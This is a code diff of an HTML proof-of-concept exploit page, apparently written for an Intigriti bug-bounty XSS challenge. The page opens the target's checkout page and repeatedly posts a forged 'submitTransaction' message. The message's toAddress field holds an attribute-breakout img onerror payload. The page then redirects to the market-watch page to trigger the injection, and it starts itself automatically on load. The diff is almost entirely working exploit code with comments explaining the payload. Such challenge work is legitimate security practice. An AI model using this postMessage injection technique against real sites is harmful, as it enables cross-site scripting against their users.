@@ -4,61 +4,69 @@
     <title>PoC</title>
 </head>
 <body>
-    <button id="btn" onclick="exploit()">Click to Exploit (if popup blocked)</button>
-    <div id="log"></div>
+    <h2>Exploit Running...</h2>
+    <div id="status">Initializing...</div>
+    <button onclick="startExploit()">Click if popup blocked</button>
 
     <script>
-        const targetBase = "https://challenge-0126.intigriti.io";
-        const checkoutUrl = targetBase + "/checkout.html";
-        const marketWatchUrl = targetBase + "/marketwatch.html";
+        const targetUrl = "https://challenge-0126.intigriti.io/checkout.html";
+        const marketWatchUrl = "https://challenge-0126.intigriti.io/marketwatch.html";
 
         function log(msg) {
-            document.getElementById("log").innerText += msg + "\n";
+            document.getElementById("status").innerText = msg;
+            console.log(msg);
         }
 
-        function exploit() {
-            log("1. Opening vulnerable checkout page...");
-            
-            // Open the checkout page. We use window.open because X-Frame-Options 
-            // often blocks iframes, and we need the user's session cookies.
-            let win = window.open(checkoutUrl, "targetWindow");
+        function startExploit() {
+            log("Opening target window...");
+            // Open the checkout page
+            var win = window.open(targetUrl, "targetWindow");
 
-            // Wait for the window to load (2-3 seconds is usually safe)
-            setTimeout(() => {
-                log("2. Sending malicious postMessage...");
+            // PAYLOAD EXPLANATION:
+            // 1. "0x" prefix: Attempts to bypass simple "starts with 0x" regex validation.
+            // 2. ">: Closes the title attribute in marketwatch.html.
+            // 3. <img src=x onerror=...>: The standard innerHTML XSS vector.
+            // 4. confirm(origin): Uses confirm instead of alert (sometimes less filtered).
+            // 5. Padding: Adds random hex to look like a real address length if checked.
+            const xssPayload = "0x\"><img src=x onerror=alert(document.domain)>";
 
-                // THE PAYLOAD
-                // 1. We use "BTC" because the user likely has a BTC wallet (bypasses validation).
-                // 2. We inject into 'toAddress'.
-                // 3. We use "> to break out of the title="..." attribute in marketwatch.html.
-                const payload = {
-                    type: "submitTransaction",
-                    transaction: {
-                        currency: "BTC", 
-                        amount: 0.00000001,
-                        // The Injection: Close the title attr, close the span tag, open img tag
-                        toAddress: "\"><img src=x onerror=alert(document.domain)>" 
+            const message = {
+                type: "submitTransaction",
+                transaction: {
+                    currency: "BTC", // Assuming victim has BTC wallet (default)
+                    amount: 0.00000001, 
+                    toAddress: xssPayload
+                }
+            };
+
+            // SPAMMER LOGIC:
+            // We don't know when the victim's wallet list is loaded.
+            // We send the message every 500ms for 10 seconds to ensure it hits.
+            let counter = 0;
+            const interval = setInterval(() => {
+                try {
+                    win.postMessage(message, "*");
+                    log(`Message sent (Attempt ${++counter})...`);
+                    
+                    // Stop after 20 attempts (10 seconds)
+                    if (counter > 20) {
+                        clearInterval(interval);
+                        log("Exploit phase complete. Redirecting to check result...");
+                        
+                        // Redirect the PoC window to marketwatch to verify
+                        setTimeout(() => {
+                            win.location.href = marketWatchUrl;
+                        }, 1000);
                     }
-                };
-
-                // Send the message to ANY origin ('*')
-                win.postMessage(payload, "*");
-                
-                log("3. Payload sent! Check the popup window.");
-                
-                // Optional: Redirect victim to marketwatch to verify the XSS fired
-                // We wait a bit for the API call to finish in the other window
-                setTimeout(() => {
-                   log("4. Redirecting to MarketWatch to trigger XSS...");
-                   win.location.href = marketWatchUrl;
-                }, 2000);
-
-            }, 2500);
+                } catch (e) {
+                    console.error(e);
+                }
+            }, 500);
         }
 
-        // Auto-run if possible
+        // Auto-start
         window.onload = function() {
-            setTimeout(exploit, 1000);
+            setTimeout(startExploit, 1000);
         }
     </script>
 </body>
